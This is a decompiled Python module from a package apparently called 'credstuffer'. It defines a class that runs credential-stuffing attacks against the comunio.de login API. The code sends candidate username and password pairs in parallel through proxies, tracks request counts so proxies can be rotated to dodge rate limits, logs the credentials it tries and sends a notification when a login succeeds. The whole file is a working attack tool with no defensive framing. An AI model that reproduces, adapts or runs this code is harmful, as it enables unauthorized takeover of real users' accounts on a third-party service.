# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build/bdist.linux-x86_64/egg/credstuffer/accounts/comunio.py
# Compiled at: 2020-04-05 08:14:43
# Size of source mod 2**32: 3981 bytes
import logging, requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from credstuffer import UserAccount
from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError, InternetConnectionError

class Comunio(UserAccount):
    __doc__ = " class Comunio to provide basic methods for credstuffing comunio.de\n\n    USAGE:\n            comunio = Comunio(max_requests=10000, notify='mail', **kwargs)\n\n    "

    def __init__(self, max_requests=10000, notify=None, **kwargs):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Comunio')
        self.name = 'Comunio'
        (super().__init__)(name=self.name, notify=notify, **kwargs)
        self.headers.update({'Origin':'http://www.comunio.de', 
         'Content-Type':'application/x-www-form-urlencoded', 
         'Referer':'http://www.comunio.de/home'})
        self.comunio_login_url = 'http://api.comunio.de/login'
        self.max_requests = max_requests
        self.request_counter = 0

    def login(self, password):
        """ requests given login data to the account

        """
        if self.session.proxies:
            if self.request_counter < self.max_requests:
                with ThreadPoolExecutor(max_workers=(len(self.usernames))) as (executor):
                    future_response = {executor.submit(self._Comunio__request_login, user, password):user for user in self.usernames}
                    for i, future in enumerate(as_completed(future_response)):
                        user = future_response[future]
                        statuscode = future.result().status_code
                        if self.request_counter % len(self.usernames) == 0:
                            self.logger.info('response code: {} from comunio with username: {}, password: {}, proxy: {}'.format(statuscode, user, password, self.session.proxies['http']))
                        if statuscode == 200:
                            self.send_notification(username=user, password=password)
                        if statuscode == 500:
                            self.logger.error(future.result().text)

            else:
                self.request_counter = 0
                self.logger.error('Max number of proxy requests reached!. Renew Proxy')
                raise ProxyMaxRequestError('Max number of proxy requests reached!')
        else:
            raise ProxyNotSetError('No Proxy was set!')

    def __request_login(self, username, password):
        """ request login with an session object

        :return: Request response object
        """
        login_form = [
         (
          'username', username), ('password', password)]
        try:
            request_login = self.session.post((self.comunio_login_url), headers=(self.headers), data=login_form, timeout=(self.login_request_timeout),
              allow_redirects=False)
            self.request_counter += 1
        except requests.exceptions.RequestException as ex:
            if self.is_internet_available():
                raise ProxyBadConnectionError('Proxy Bad Connection: Exception: {}'.format(ex))
            else:
                raise InternetConnectionError('InternetConnectionError: {}'.format(ex))

        return request_login

    def set_proxy(self, proxy):
        """ sets a proxy

        """
        if isinstance(proxy, dict):
            self.logger.info('set proxy to {}'.format(proxy['http']))
            self.session.proxies = proxy
        else:
            raise TypeError('proxy must be type of dictionary!')